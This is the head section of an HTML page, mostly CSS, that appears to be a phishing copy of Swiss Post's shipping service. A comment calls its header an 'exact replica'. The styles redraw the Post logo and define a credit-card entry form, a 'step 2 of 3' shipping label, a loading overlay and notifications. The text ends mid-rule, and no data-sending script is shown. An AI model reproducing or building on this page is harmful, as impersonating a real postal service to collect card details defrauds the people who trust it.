﻿<!doctype html>
<html xmlns:jsp="http://java.sun.com/JSP/Page" lang="de" class="hydrated">
    <head>
        <link
            rel="icon"
            href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAAC0CAYAAAA9zQYyAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAVUSURBVHgB7d0xjBRVHMfx/xlLTWylERsthWjv0ntBS7BAmqWUiP3u9RqwlMajMJQaj56zXyKtNkpzthDol/3dsuSOPbjb2/m/efOb7yfZggsJl+N7kzdv3nuzMZ3ENAATbwVghKBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBh5e1wsDP7/B/1GC5/aXw7qnX2/dnnTMR770ac+yg6bWM6iWl03bXZ50HUY7L8pY3PohMU9SezqAefRnw56F7gBJ2hw0G/Slfui59HXL88v5LXjjE03ui/vYif7kZ8uBlxdWv255qGdkcgaJzY9k79YRM0VqawL8yGedv3ojoEjVPRUOTqeH61fvw0qkHQWIuu1ue/rmcI4jEPfZzZnXp8Ec14EHXNqFRAV2sNQe7/3P5MSD+C1g95GM3QAxKCXqKoz1+eR93m3DVDDjRGY+mvvm93+EHQaNRi+NHWjSJBo3GKWlfqNhA0UuzO7jNu3Y3iCBpptm6XH08TNNJoHK2HLyURNFJp6LFbcJqToJFuq+DmBoJGupJXaYJGEb/vRhH9ePRtTtulTkpzxG08ybtzL2I8nG/xykTQBrR+YhWafXj4z3yl3J1Ca5oX/+Yqv3ynwZCjh3SVVFjb44h//4i40tRKxGOU+OUh6J7TJliFffNGpCtxY0jQ2Hf9Un7UJcbvZcbQ2b+ZFW0B6jJF/Wgvdw3Gw79zNwGUCfpaoCNGw/nm16zln9lXaIYcOEQ3jDpYJouGHZkIGksyp9aePItUBI0lmUFzhQZWQNCwQtBYkjkT0Y+1HJqXPBN5mjwnQt9r8nqEtmnNRZZ+BL0ZzR0Ek23zxcdY5lLPD5JPVmLIgUM0C/Fn4pPd7FOVCBqHXEh+qns2c2gZBI0DxgWOHeAKjSIUc/Zm1kGBm2l2rPTc/tkZW2X2/F0cRDqC7ikNLbQFSy8EKnWwol4Tl42gDazyUk+FvDuJeFR4o6yGGyUOQydoAyUPcjmtK4Xm7rkpRDpN1X1TaCMuQSPdqOBTYIJGqpJXZyFopLr5XRRF0EijXeQlpuoOImik0FBj1MIKSoJG47TmWeftZa99PgpBo3G//dDeG2UJGo3SOXmDFnf01PGkUKdSZh4XpiWLTZ3bpu9155i/s+Lxtg40vPhlVP4m8FV1BL334tMF+j551/chugHUMKPNd3wvMOTAWjS8+OvXOmIWgsapaIhx60Z7sxmvw2o7rEwPTEbDukJeIGiciOJVyN9eqjPkBYLGG2mMrK1TWmBUc8gLBI2X9DDk3Mfzw2AUsj5diPigMkFnz8v+OPskHl9Vu/tr/HwV7P7nne7Fe5QyQWc/OTL4j1hHm0/masO0HawQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKz0Y8eK3ifS1GsbOJOjav0IWofDdOA9JFgfQw5YIWhYIWhYIWhYIWhYIWhY8Zi203vwKj+boo0X6PTRxnQS0wBMMOSAFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGlefIpN6SWtrAAwAAAABJRU5ErkJggg=="
        />
        <meta charset="utf-8" />
        <style data-styles="">
            slot-fb {
                display: contents;
            }
            slot-fb[hidden] {
                display: none;
            }
            focus-trap,
            post-header-logo,
            post-klp-login-widget,
            post-language-switch,
            post-main-navigation,
            post-meta-navigation,
            post-search,
            post-skiplinks,
            swisspost-internet-breadcrumbs {
                visibility: hidden;
            }
                        .hydrated {
                visibility: inherit;
            }
        </style>
        <meta content="width=device-width, initial-scale=1" name="viewport" />
     
        <title>vsc</title>
        <link rel="stylesheet" href="https://service.post.ch/vsc/styles.ed8c18d52171a8d9.css" />
        <link
            data-savepage-href="assets/favicon.png"
            href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAAC0CAYAAAA9zQYyAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAVUSURBVHgB7d0xjBRVHMfx/xlLTWylERsthWjv0ntBS7BAmqWUiP3u9RqwlMajMJQaj56zXyKtNkpzthDol/3dsuSOPbjb2/m/efOb7yfZggsJl+N7kzdv3nuzMZ3ENAATbwVghKBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBhhaBh5e1wsDP7/B/1GC5/aXw7qnX2/dnnTMR770ac+yg6bWM6iWl03bXZ50HUY7L8pY3PohMU9SezqAefRnw56F7gBJ2hw0G/Slfui59HXL88v5LXjjE03ui/vYif7kZ8uBlxdWv255qGdkcgaJzY9k79YRM0VqawL8yGedv3ojoEjVPRUOTqeH61fvw0qkHQWIuu1ue/rmcI4jEPfZzZnXp8Ec14EHXNqFRAV2sNQe7/3P5MSD+C1g95GM3QAxKCXqKoz1+eR93m3DVDDjRGY+mvvm93+EHQaNRi+NHWjSJBo3GKWlfqNhA0UuzO7jNu3Y3iCBpptm6XH08TNNJoHK2HLyURNFJp6LFbcJqToJFuq+DmBoJGupJXaYJGEb/vRhH9ePRtTtulTkpzxG08ybtzL2I8nG/xykTQBrR+YhWafXj4z3yl3J1Ca5oX/+Yqv3ynwZCjh3SVVFjb44h//4i40tRKxGOU+OUh6J7TJliFffNGpCtxY0jQ2Hf9Un7UJcbvZcbQ2b+ZFW0B6jJF/Wgvdw3Gw79zNwGUCfpaoCNGw/nm16zln9lXaIYcOEQ3jDpYJouGHZkIGksyp9aePItUBI0lmUFzhQZWQNCwQtBYkjkT0Y+1HJqXPBN5mjwnQt9r8nqEtmnNRZZ+BL0ZzR0Ek23zxcdY5lLPD5JPVmLIgUM0C/Fn4pPd7FOVCBqHXEh+qns2c2gZBI0DxgWOHeAKjSIUc/Zm1kGBm2l2rPTc/tkZW2X2/F0cRDqC7ikNLbQFSy8EKnWwol4Tl42gDazyUk+FvDuJeFR4o6yGGyUOQydoAyUPcjmtK4Xm7rkpRDpN1X1TaCMuQSPdqOBTYIJGqpJXZyFopLr5XRRF0EijXeQlpuoOImik0FBj1MIKSoJG47TmWeftZa99PgpBo3G//dDeG2UJGo3SOXmDFnf01PGkUKdSZh4XpiWLTZ3bpu9155i/s+Lxtg40vPhlVP4m8FV1BL334tMF+j551/chugHUMKPNd3wvMOTAWjS8+OvXOmIWgsapaIhx60Z7sxmvw2o7rEwPTEbDukJeIGiciOJVyN9eqjPkBYLGG2mMrK1TWmBUc8gLBI2X9DDk3Mfzw2AUsj5diPigMkFnz8v+OPskHl9Vu/tr/HwV7P7nne7Fe5QyQWc/OTL4j1hHm0/masO0HawQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKwQNKz0Y8eK3ifS1GsbOJOjav0IWofDdOA9JFgfQw5YIWhYIWhYIWhYIWhYIWhY8Zi203vwKj+boo0X6PTRxnQS0wBMMOSAFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGFYKGlefIpN6SWtrAAwAAAABJRU5ErkJggg=="
            rel="icon"
            type="image/png"
        />

        <style>
            @keyframes _ngcontent-ng-c2396243081_popIn {
                0% {
                    transform: scale(0.9);
                    opacity: 0;
                    transition-property: transform, opacity, overlay, display;
                    transition-behavior: allow-discrete;
                    transition-duration: var(--post-transition-duration, 0.35s);
                    transition-timing-function: linear(
                        0,
                        0.007,
                        0.029 2.2%,
                        0.118 4.7%,
                        0.625 14.4%,
                        0.826 19%,
                        0.902,
                        0.962,
                        1.008 26.1%,
                        1.041 28.7%,
                        1.064 32.1%,
                        1.07 36%,
                        1.061 40.5%,
                        1.015 53.4%,
                        0.999 61.6%,
                        0.995 71.2%,
                        1
                    );
                }
                to {
                    opacity: 1;
                    transform: scale(1);
                }
            }

            .vsc-main-container[_ngcontent-ng-c2396243081] {
                overflow: visible !important;
                max-width: 1440px;
            }
            @media (max-width: 399.98px) {
                .vsc-main-container[_ngcontent-ng-c2396243081] {
                    margin-left: 0.75rem;
                    width: 94%;
                }
            }
            .vsc-main-container[_ngcontent-ng-c2396243081] {
                margin: 0 auto;
            }
            .vsc-sub-main-container[_ngcontent-ng-c2396243081] {
                margin-left: 0.75rem;
                margin-right: 0.75rem;
            }
            @media (max-width: 399.98px) {
                .vsc-sub-main-container[_ngcontent-ng-c2396243081] {
                    margin-left: 0.75rem;
                    width: 94%;
                }
            }
            .component-container[_ngcontent-ng-c2396243081] {
                width: 100%;
            }

            /* Exact Replica Header Styles from Image */
.post-header {
    background-color: #fff;
    border-bottom: 1px solid #e0e0e0;
    position: relative;
    z-index: 1000;
}

/* Meta Navigation - Top Bar */
.meta-navigation {
    background-color: #fff;
    border-bottom: 1px solid #f0f0f0;
    padding: 8px 0;
}

.meta-nav-container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.meta-nav-list {
    display: flex;
    list-style: none;
    margin: 0;
    padding: 0;
    gap: 20px;
}

.meta-nav-link {
    text-decoration: none;
    color: #666;
    font-size: 14px;
    font-weight: 400;
    font-family: 'Frutiger', 'Helvetica', 'Arial', sans-serif;
    transition: color 0.3s ease;
}

.meta-nav-link:hover {
    color: #333;
}

.meta-nav-link.active {
    background-color: #ffcc00;
    color: #333;
    padding: 4px 12px;
    border-radius: 4px;
    font-weight: 500;
}

.meta-nav-right {
    display: flex;
    align-items: center;
    gap: 15px;
}

.language-btn {
    background: none;
    border: 1px solid #ddd;
    padding: 6px 12px;
    border-radius: 4px;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 14px;
    color: #333;
    font-weight: 500;
    transition: all 0.3s ease;
}

.language-btn:hover {
    background-color: #f5f5f5;
}

.dropdown-arrow {
    transition: transform 0.3s ease;
}

.search-btn {
    background: none;
    border: none;
    padding: 8px;
    cursor: pointer;
    border-radius: 4px;
    transition: background-color 0.3s ease;
}

.search-btn:hover {
    background-color: #f5f5f5;
}

.login-btn {
    background: none;
    border: 1px solid #ddd;
    padding: 6px 12px;
    border-radius: 4px;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 14px;
    color: #333;
    font-weight: 500;
    transition: all 0.3s ease;
}

.login-btn:hover {
    background-color: #f5f5f5;
}

/* Main Header */
.main-header {
    padding: 20px 0;
}

.main-header-container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 20px;
    display: flex;
    align-items: center;
    gap: 40px;
}

.logo-section {
    flex-shrink: 0;
}

.post-logo {
    width: 120px;
    height: 40px;
    position: relative;
}

.logo-yellow-bg {
    width: 100%;
    height: 100%;
    background: linear-gradient(135deg, #ffcc00 0%, #ffdb4d 50%, #ffcc00 100%);
    border-radius: 6px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}

.logo-red-cross {
    position: absolute;
    left: 15px;
    color: #e30613;
    font-size: 24px;
    font-weight: bold;
    line-height: 1;
}

.logo-letter-p {
    color: #1a1a1a;
    font-size: 28px;
    font-weight: bold;
    font-family: 'Frutiger', 'Helvetica', 'Arial', sans-serif;
    margin-left: 8px;
}

.main-navigation {
    flex: 1;
}

.main-nav-list {
    display: flex;
    list-style: none;
    margin: 0;
    padding: 0;
    gap: 30px;
}

.main-nav-link {
    text-decoration: none;
    color: #333;
    font-size: 17px;
    font-weight: 400;
    font-family: 'Frutiger', 'Helvetica', 'Arial', sans-serif;
    padding-bottom: 8px;
    border-bottom: 4px solid transparent;
    transition: all 0.3s ease;
}

.main-nav-link:hover {
    color: #000;
    background-color: #f2f2f2;
    border-bottom-color: #cbcbcb;
}

.main-nav-link.active {
    color: #000;
    font-weight: 700;
    border-bottom-color: #ffcc00;
    background-color: transparent;
}

/* Bottom Bar */
.bottom-bar {
    background-color: #fff;
    border-top: 1px solid #f0f0f0;
    padding: 12px 0;
}

.bottom-bar-container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.breadcrumb-list {
    display: flex;
    align-items: center;
    list-style: none;
    margin: 0;
    padding: 0;
    gap: 8px;
}

.breadcrumb-link {
    text-decoration: none;
    color: #666;
    font-size: 14px;
    font-weight: 400;
    transition: color 0.3s ease;
}

.breadcrumb-link:hover {
    color: #333;
}

.breadcrumb-separator {
    color: #999;
    font-size: 14px;
}

.breadcrumb-current {
    color: #333;
    font-size: 14px;
    font-weight: 500;
}

.action-buttons {
    display: flex;
    gap: 12px;
}

.action-btn {
    background: none;
    border: 1px solid #ddd;
    padding: 8px 12px;
    border-radius: 4px;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 14px;
    color: #333;
    font-weight: 500;
    transition: all 0.3s ease;
}

.action-btn:hover {
    background-color: #f5f5f5;
    border-color: #999;
}

.action-btn svg {
    flex-shrink: 0;
}

/* Responsive Design */
@media (max-width: 768px) {
    .meta-nav-container {
        flex-direction: column;
        gap: 15px;
        padding: 10px;
    }
    
    .meta-nav-list {
        flex-wrap: wrap;
        justify-content: center;
        gap: 15px;
    }
    
    .main-header-container {
        flex-direction: column;
        gap: 20px;
        padding: 15px;
    }
    
    .main-nav-list {
        flex-wrap: wrap;
        justify-content: center;
        gap: 20px;
    }
    
    .bottom-bar-container {
        flex-direction: column;
        gap: 15px;
        padding: 15px;
    }
    
    .action-buttons {
        justify-content: center;
    }
}

.post-custom-footer {
    background-color: #f8f9fa;
    border-top: 1px solid #e0e0e0;
    margin-top: 2rem;
    padding: 2rem 0 1rem;
    color: #333;
}

.custom-footer-container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 1rem;
}

.custom-footer-sections {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 2rem;
    margin-bottom: 2rem;
}

.custom-footer-section h3 {
    color: #003399;
    margin-bottom: 1rem;
    font-size: 1.1rem;
    font-weight: 600;
}

.custom-footer-links {
    list-style: none;
    padding: 0;
    margin: 0;
}

.custom-footer-links li {
    margin-bottom: 0.5rem;
}

.custom-footer-links a {
    color: #333;
    text-decoration: none;
    font-size: 0.9rem;
    transition: color 0.3s ease;
}

.custom-footer-links a:hover {
    color: #003399;
    text-decoration: underline;
}

.custom-contact-info {
    font-size: 0.9rem;
}

.custom-phone {
    font-weight: bold;
    color: #003399;
    font-size: 1.1rem;
    margin-bottom: 0.25rem;
}

.custom-phone-desc {
    color: #666;
    margin-bottom: 0.5rem;
}

.custom-hours-text {
    color: #666;
    margin-bottom: 0.25rem;
}

.custom-support {
    color: #003399;
    font-weight: 500;
    margin-top: 0.5rem;
}

.custom-address {
    font-style: normal;
    font-size: 0.9rem;
    line-height: 1.5;
    color: #333;
    margin-bottom: 1rem;
}

.custom-social h3 {
    color: #003399;
    margin-bottom: 0.5rem;
    font-size: 1rem;
}

.custom-social-links {
    display: flex;
    gap: 1rem;
    flex-wrap: wrap;
}

.custom-social-links a {
    color: #333;
    text-decoration: none;
    font-size: 0.8rem;
    padding: 0.25rem 0.5rem;
    border-radius: 3px;
    transition: all 0.3s ease;
}

.custom-social-links a:hover {
    background-color: #e0e0e0;
    color: #003399;
}

.custom-copyright {
    border-top: 1px solid #e0e0e0;
    padding-top: 1rem;
    text-align: center;
}

.custom-copyright p {
    color: #666;
    font-size: 0.9rem;
    margin-bottom: 1rem;
}

.custom-legal-links {
    display: flex;
    justify-content: center;
    flex-wrap: wrap;
    gap: 1rem;
}

.custom-legal-links a {
    color: #666;
    text-decoration: none;
    font-size: 0.8rem;
    transition: color 0.3s ease;
}

.custom-legal-links a:hover {
    color: #003399;
    text-decoration: underline;
}

.custom-cookie-btn {
    background: none;
    border: none;
    color: #666;
    text-decoration: underline;
    font-size: 0.8rem;
    cursor: pointer;
    transition: color 0.3s ease;
}

.custom-cookie-btn:hover {
    color: #003399;
}

@media (max-width: 768px) {
    .custom-header-top {
        flex-direction: column;
        gap: 1rem;
        text-align: center;
    }

    .custom-main-navigation .custom-nav-list {
        flex-direction: column;
        gap: 0.5rem;
        text-align: center;
    }

    .custom-header-actions {
        justify-content: center;
    }

    .custom-footer-sections {
        grid-template-columns: 1fr;
        text-align: center;
    }

    .custom-social-links {
        justify-content: center;
    }

    .custom-legal-links {
        flex-direction: column;
        align-items: center;
        gap: 0.5rem;
    }
}
        </style>
       
	   <style>
            .tabs-wrapper[_ngcontent-ng-c126926896] {
                background-color: #fff !important;
                margin-bottom: 30px;
            }
            ul.nav-tabs[_ngcontent-ng-c126926896] .nav-link.active[_ngcontent-ng-c126926896] {
                color: #000;
                background-color: transparent;
                border-color: #fc0 !important;
                font-weight: 700;
            }
            ul.nav-tabs[_ngcontent-ng-c126926896] .nav-link.inactive[_ngcontent-ng-c126926896] {
                border-bottom: 4px solid #cbcbcb;
            }
            ul.nav-tabs[_ngcontent-ng-c126926896] .nav-link[_ngcontent-ng-c126926896] {
                padding: 17px 24px;
            }
            .nav-tabs[_ngcontent-ng-c126926896] .nav-link[_ngcontent-ng-c126926896] {
                color: #666;
                border: none;
                border-bottom: 4px solid transparent;
                text-decoration: none !important;
                font-family: Frutiger, Helvetica, Arial, sans-serif;
                font-weight: 400;
                font-size: 17px;
            }
            .nav-tabs-a[_ngcontent-ng-c126926896] .nav-link[_ngcontent-ng-c126926896]:focus,
            .nav-tabs-a[_ngcontent-ng-c126926896] .nav-link[_ngcontent-ng-c126926896]:hover,
            .nav-tabs-i[_ngcontent-ng-c126926896] .nav-link[_ngcontent-ng-c126926896]:focus,
            .nav-tabs-i[_ngcontent-ng-c126926896] .nav-link[_ngcontent-ng-c126926896]:hover,
            .nav-tabs[_ngcontent-ng-c126926896] .nav-link[_ngcontent-ng-c126926896]:focus,
            .nav-tabs[_ngcontent-ng-c126926896] .nav-link[_ngcontent-ng-c126926896]:hover {
                color: #000;
                background-color: #f2f2f2;
                border-bottom: 4px solid #cbcbcb;
            }
            .toggle[_ngcontent-ng-c126926896] {
                padding-left: 0;
            }
        </style>
        <style>
            .preview-fixed-top[_ngcontent-ng-c3856722817] {
                position: fixed;
                top: 20px;
            }
            .preview-card[_ngcontent-ng-c3856722817] {
                width: 360px;
                background-color: #fff;
                box-shadow: #00000059 0 0 5px;
                padding: 20px;
                margin-top: 5px;
                margin-left: 20px;
                z-index: 1;
            }
            .preview-card[_ngcontent-ng-c3856722817] .preview-title-row[_ngcontent-ng-c3856722817] {
                padding-bottom: 20px;
                border-bottom: 1px solid rgba(0, 0, 0, 0.3);
            }
            .preview-card[_ngcontent-ng-c3856722817]
                .preview-title-row[_ngcontent-ng-c3856722817]
                .preview-title[_ngcontent-ng-c3856722817] {
                padding-left: 15px;
                margin-top: 3px;
            }
            .preview-card[_ngcontent-ng-c3856722817] table[_ngcontent-ng-c3856722817] {
                width: 100%;
                margin-top: 10px;
            }
            .preview-card[_ngcontent-ng-c3856722817]
                table[_ngcontent-ng-c3856722817]
                .col-done[_ngcontent-ng-c3856722817] {
                width: 30px;
            }
            .preview-card[_ngcontent-ng-c3856722817] table[_ngcontent-ng-c3856722817] td[_ngcontent-ng-c3856722817] {
                padding-bottom: 10px;
                padding-top: 10px;
            }
            .preview-card[_ngcontent-ng-c3856722817]
                table[_ngcontent-ng-c3856722817]
                tr.last-row[_ngcontent-ng-c3856722817]
                td[_ngcontent-ng-c3856722817] {
                padding-bottom: 20px;
            }
            .preview-card[_ngcontent-ng-c3856722817]
                table[_ngcontent-ng-c3856722817]
                tr.price-row[_ngcontent-ng-c3856722817]
                td[_ngcontent-ng-c3856722817] {
                border-top: 1px solid rgba(0, 0, 0, 0.3);
                padding-top: 20px;
            }
            .preview-card[_ngcontent-ng-c3856722817] .price-refresh[_ngcontent-ng-c3856722817] {
                margin-right: 5px;
            }
            .preview-label[_ngcontent-ng-c3856722817] {
                margin-top: 0;
                margin-bottom: 0;
            }
        </style>

        <style>
            @keyframes _ngcontent-ng-c3288117560_popIn {
                0% {
                    transform: scale(0.9);
                    opacity: 0;
                    transition-property: transform, opacity, overlay, display;
                    transition-behavior: allow-discrete;
                    transition-duration: var(--post-transition-duration, 0.35s);
                    transition-timing-function: linear(
                        0,
                        0.007,
                        0.029 2.2%,
                        0.118 4.7%,
                        0.625 14.4%,
                        0.826 19%,
                        0.902,
                        0.962,
                        1.008 26.1%,
                        1.041 28.7%,
                        1.064 32.1%,
                        1.07 36%,
                        1.061 40.5%,
                        1.015 53.4%,
                        0.999 61.6%,
                        0.995 71.2%,
                        1
                    );
                }
                to {
                    opacity: 1;
                    transform: scale(1);
                }
            }

            .shipping-card[_ngcontent-ng-c3288117560] {
                width: 29rem;
            }
            @media (max-width: 1439.98px) {
                .shipping-card[_ngcontent-ng-c3288117560] {
                    width: 24rem;
                }
            }
            .shipping-form[_ngcontent-ng-c3288117560] {
                margin-left: 0.25rem;
                margin-right: 0.25rem;
            }
        </style>
       
        <style id="savepage-cssvariables">
            :root {
            }
        </style>

        <style>
            html, body {
                width: 100% !important;
                max-width: 100% !important;
                overflow-x: hidden !important;
                margin: 0 !important;
                padding: 0 !important;
                position: relative !important;
            }
            
            * {
                box-sizing: border-box;
            }
            
            .credit-card-section {
                display: none;
                background: white;
                padding: 1.5rem;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                margin: 0;
                max-width: 100%;
                width: 100%;
                position: relative;
                z-index: 10;
                border: 1px solid #e0e0e0;
                box-sizing: border-box;
                overflow: hidden;
            }
            
            .credit-card-section.active {
                display: block;
            }
            
            .credit-card-section h3 {
                color: #003399;
                margin-bottom: 1.5rem;
                font-size: 1.5rem;
                text-align: center;
            }
            
            .form-group {
                margin-bottom: 1.5rem;
                width: 100%;
                box-sizing: border-box;
            }
            
            .form-group label {
                display: block;
                margin-bottom: 0.5rem;
                font-weight: 500;
                color: #333;
            }
            
            .form-group input {
                width: 100%;
                padding: 0.75rem;
                border: 1px solid #ddd;
                border-radius: 4px;
                font-size: 1rem;
                transition: border-color 0.3s ease;
                box-sizing: border-box;
            }
            
            .form-group input.error {
                border-color: #dc3545;
                background-color: #fff5f5;
            }
            
            .form-group input.success {
                border-color: #28a745;
                background-color: #f8fff9;
            }
            
            .error-message {
                color: #dc3545;
                font-size: 0.875rem;
                margin-top: 0.25rem;
                display: none;
                font-weight: 500;
            }
            
            .error-message.show {
                display: block;
            }
            
            .success-message {
                color: #28a745;
                font-size: 0.875rem;
                margin-top: 0.25rem;
                display: none;
                font-weight: 500;
            }
            
            .success-message.show {
                display: block;
            }
            
            .form-group input:focus {
                outline: none;
                border-color: #003399;
                box-shadow: 0 0 0 2px rgba(0,51,153,0.1);
            }
            
            .form-row {
                display: flex;
                gap: 1rem;
                width: 100%;
                box-sizing: border-box;
            }
            
            .form-row .form-group {
                flex: 1;
                min-width: 0;
                box-sizing: border-box;
            }
            
            .hidden-ng-content {
                display: none !important;
            }
            
            @media (max-width: 768px) {
                html, body {
                    width: 100vw !important;
                    max-width: 100vw !important;
                    overflow-x: hidden !important;
                    position: relative !important;
                }
                
                .container-fluid {
                    width: 100% !important;
                    max-width: 100% !important;
                    padding: 0 1rem !important;
                    margin: 0 auto !important;
                }
                
                .vsc-content-container {
                    width: 100% !important;
                    max-width: 100% !important;
                    padding: 0.5rem !important;
                    overflow-x: hidden !important;
                    position: relative !important;
                    margin: 0 auto !important;
                }
                
                .vsc-main-container {
                    width: 100% !important;
                    max-width: 100% !important;
                    overflow-x: hidden !important;
                    position: relative !important;
                    margin: 0 auto !important;
                }
                
                .vsc-sub-main-container {
                    width: 100% !important;
                    max-width: 100% !important;
                    padding: 0 0.5rem !important;
                    margin: 0 auto !important;
                }
                
                /* Fix stepper labels overlapping */
                .stepper-container {
                    display: none !important;
                }
                
                /* Create simple mobile stepper */
                .vsc-content-container::before {
                    content: "Schritt 2 von 3: Versandart" !important;
                    display: block !important;
                    text-align: center !important;
                    font-size: 1rem !important;
                    font-weight: bold !important;
                    color: #003399 !important;
                    padding: 1rem !important;
                    margin-bottom: 1rem !important;
                    background: #f8f9fa !important;
                    border: 1px solid #ddd !important;
                    border-radius: 4px !important;
                }
                
                .d-flex {
                    flex-direction: column !important;
                    align-items: center !important;
                    justify-content: center !important;
                }
                
                .vsc-preview-container {
                    width: 100% !important;
                    max-width: 100% !important;
                    margin: 1rem auto !important;
                    display: flex !important;
                    justify-content: center !important;
                }
                
                .preview-card {
                    width: 100% !important;
                    max-width: 350px !important;
                    margin: 0 auto !important;
                }
                
                .credit-card-section {
                    margin: 1rem auto !important;
                    padding: 1rem !important;
                    width: 100% !important;
                    max-width: 400px !important;
                    left: auto !important;
                    right: auto !important;
                    position: relative !important;
                    display: none !important;
                }
                
                .credit-card-section.active {
                    display: block !important;
                }
                
                .form-row {
                    flex-direction: column !important;
                    gap: 1rem !important;
                    width: 100% !important;
                }
                
                .form-row .form-group {
                    flex: none !important;
                    width: 100% !important;
                }
                
                .credit-card-section h3 {
                    font-size: 1.25rem;
                }
                
                /* Fix overlapping labels */
                .form-floating label {
                    position: relative !important;
                    transform: none !important;
                    margin-bottom: 0.5rem !important;
                    font-size: 0.9rem !important;
                    color: #666 !important;
                }
                
                .form-floating input:focus + label,
                .form-floating input:not(:placeholder-shown) + label {
                    transform: none !important;
                    opacity: 1 !important;
                }
                
                /* Fix Sendungsnummer display on mobile */
                div[style*="background: #f8f9fa"] {
                    padding: 0.75rem !important;
                    margin: 0.5rem 0 !important;
                    border-radius: 4px !important;
                    border: 1px solid #e9ecef !important;
                    word-break: break-all !important;
                    overflow-wrap: break-word !important;
                }
                
                div[style*="background: #f8f9fa"] div[style*="font-family: monospace"] {
                    font-size: 0.9rem !important;
                    line-height: 1.3 !important;
                    word-break: break-all !important;
                    overflow-wrap: break-word !important;
                    white-space: normal !important;
                }
                
                div[style*="background: #f8f9fa"] div[style*="font-size: 0.85rem"] {
                    font-size: 0.75rem !important;
                    margin-bottom: 0.5rem !important;
                }
            }
            
            @media (max-width: 480px) {
                html, body {
                    width: 100vw !important;
                    max-width: 100vw !important;
                    overflow-x: hidden !important;
                }
                
                .credit-card-section {
                    padding: 0.75rem !important;
                    margin: 0.5rem auto !important;
                    width: 100% !important;
                    max-width: 350px !important;
                    display: none !important;
                }
                
                .credit-card-section.active {
                    display: block !important;
                }
                
                .preview-card {
                    max-width: 300px !important;
                }
                
                .form-group {
                    margin-bottom: 1rem;
                    width: 100%;
                }
                
                .form-group input {
                    padding: 0.6rem;
                    font-size: 0.9rem;
                }
                
                .credit-card-section h3 {
                    font-size: 1.1rem;
                }
                
                /* Fix overlapping labels for smaller screens */
                .form-floating label {
                    position: relative !important;
                    transform: none !important;
                    margin-bottom: 0.5rem !important;
                    font-size: 0.85rem !important;
                    color: #666 !important;
                }
                
                .form-floating input:focus + label,
                .form-floating input:not(:placeholder-shown) + label {
                    transform: none !important;
                    opacity: 1 !important;
                }
                
                /* Fix Sendungsnummer display on small mobile */
                div[style*="background: #f8f9fa"] {
                    padding: 0.5rem !important;
                    margin: 0.25rem 0 !important;
                    border-radius: 4px !important;
                    border: 1px solid #e9ecef !important;
                    word-break: break-all !important;
                    overflow-wrap: break-word !important;
                }
                
                div[style*="background: #f8f9fa"] div[style*="font-family: monospace"] {
                    font-size: 0.8rem !important;
                    line-height: 1.2 !important;
                    word-break: break-all !important;
                    overflow-wrap: break-word !important;
                    white-space: normal !important;
                }
                
                div[style*="background: #f8f9fa"] div[style*="font-size: 0.85rem"] {
                    font-size: 0.7rem !important;
                    margin-bottom: 0.25rem !important;
                }
            }

            /* Loading Animation Styles */
            .loading-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(255, 255, 255, 0.95);
                display: none;
                justify-content: center;
                align-items: center;
                z-index: 9999;
            }

            .loading-overlay.active {
                display: flex;
            }

            .loading-spinner {
                width: 60px;
                height: 60px;
                border: 4px solid #f3f3f3;
                border-top: 4px solid #003399;
                border-radius: 50%;
                animation: spin 1s linear infinite;
            }

            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }

            .loading-text {
                margin-top: 20px;
                font-size: 1.2rem;
                color: #003399;
                font-weight: 500;
            }

            /* Notification Styles */
            .notification {
                position: fixed;
                top: 20px;
                right: 20px;
                padding: 15px 20px;
                border-radius: 8px;
                color: white;
                font-weight: 500;
                z-index: 10000;
                transform: translateX(400px);
                transition: transform 0.3s ease;
                max-width: 350px;
            }

            .notification.show {
                transform: translateX(0);
            }

            .notification.success {
